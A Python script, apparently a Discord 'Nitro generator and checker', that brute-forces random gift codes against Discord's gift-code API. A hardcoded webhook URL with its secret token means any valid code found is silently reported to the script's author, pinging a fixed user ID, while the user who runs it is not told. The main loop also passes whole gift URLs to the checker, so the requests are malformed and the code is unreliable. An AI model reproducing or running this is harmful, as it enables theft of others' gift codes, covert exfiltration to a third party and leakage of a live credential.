# Programming and Editing By programmer2004
import os
import random
import string
import time
import ctypes

try: 
    from discord_webhook import DiscordWebhook 
except ImportError: 
    input(f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit") # Tell the user it has not been installed and how to install it
    exit() 
try: 
    import requests 
except ImportError: 
    input(f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")# Tell the user it has not been installed and how to install it
    exit() 


class NitroGen: 
    def __init__(self): 
        self.fileName = "Nitro Codes.txt" 

    def main(self): 
        os.system('cls' if os.name == 'nt' else 'clear') 
        if os.name == "nt": 
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker - Made by aLiReZa2004#8890") 
        else: 
            print(f'\33]0;Nitro Generator and Checker - Made by aLiReZa2004#8890\a', end='', flush=True) 

        print(""" 
█▀▀█ █▀▀█ █▀▀█ █▀▀▀ █▀▀█ █▀▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀▀█ █▀█ █▀▀█ █▀▀█ ░█▀█░
█░░█ █▄▄▀ █░░█ █░▀█ █▄▄▀ █▄▄█ █░▀░█ █░▀░█ █▀▀ █▄▄▀ ░▄▀ █▄▀█ █▄▀█ █▄▄█▄
█▀▀▀ ▀░▀▀ ▀▀▀▀ ▀▀▀▀ ▀░▀▀ ▀░░▀ ▀░░░▀ ▀░░░▀ ▀▀▀ ▀░▀▀ █▄▄ █▄▄█ █▄▄█ ░░░█░
                                                        """) 
        time.sleep(2) 
        self.slowType("Dev by: aLiReZa2004#8890", .05) 
        time.sleep(1) 
        self.slowType("\n Tedad cod baray check ra vared konid: ", .05, newLine = False) 

        num = int(input('')) 

        self.slowType(" \n   starting... \n \n", .08, newLine = False)
        webhook = url = "https://discord.com/api/webhooks/845803198517084171/Yk-elnZynuyZv7-vZ4EJ-LPfuWRTJ85Tbc6oFFY3qdDwFuKnuesMGAzZ1NZyJo7jm1Wk"

        

        valid = [] 
        invalid = 0 

        for i in range(num): 
            try: 
                code = "".join(random.choices( 
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))
                url = f"https://discord.gift/{code}" 

                result = self.quickChecker(url, webhook) 

                if result: 
                    valid.append(url) 
                else: 
                    invalid += 1 
            except Exception as e: 
                print(f" Error | {url} ") 

            if os.name == "nt": 
                ctypes.windll.kernel32.SetConsoleTitleW(f"checking- {len(valid)} Valid | {invalid} Invalid | All : {num}- Dev by aLiReZa2004#8890") 
                print("")
            else: 
                print(f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by aLiReZa2004#8890\a', end='', flush=True) 

        print(f"""
Natije:
 Valid: {len(valid)}
 Invalid: {invalid}
 Valid Codes: {', '.join(valid )}""") 

        input("\nThe end! baray exit 5 bar enter ra bezanid.") 
        [input(i) for i in range(4,0,-1)] 


    def slowType(self, text, speed, newLine = True): 
        for i in text: 
            print(i, end = "", flush = True) 
            time.sleep(speed) 
        if newLine: 
            print() 

    def generator(self, amount): 
        with open(self.fileName, "w", encoding="utf-8") as file: 
            print(" dar hale sakht nitro code") 

            start = time.time() 

            for i in range(amount): 
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                )) 

                file.write(f"https://discord.gift/{code}\n") 

            
            print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n") 

    def fileChecker(self, notify = None): 
        valid = [] 
        invalid = 0 
        with open(self.fileName, "r", encoding="utf-8") as file: 
            for line in file.readlines(): 
                nitro = line.strip("\n") 

                
                url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                response = requests.get(url) 

                if response.status_code == 200: 
                    print(f" Valid | {nitro} ") 
                    valid.append(nitro) 

                    if notify is not None: 
                        DiscordWebhook( # Send the message to discord letting the user know there has been a valid nitro code
                            url = notify,
                            content = f"Valid Nito Code detected! <@628211871974948864> \n{nitro}"
                        ).execute()
                    else: 
                        break

                else: 
                    print(f" Invalid | {nitro} ") 
                    invalid += 1 

        return {"valid" : valid, "invalid" : invalid} 

    def quickChecker(self, nitro, notify = None): 
        # Generate the request url
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url) 

        if response.status_code == 200: 
            print(f" Valid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") 
            with open("Nitro Codes.txt", "w") as file: 
                file.write(nitro) 

            if notify is not None: 
                DiscordWebhook( 
                    url = notify,
                    content = f"Valid Nito Code detected! <@628211871974948864> \n{nitro}"
                ).execute()

            return True 

        else: 
            print(f" Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") 
            return False 

if __name__ == '__main__':
    Gen = NitroGen()
    Gen.main() 
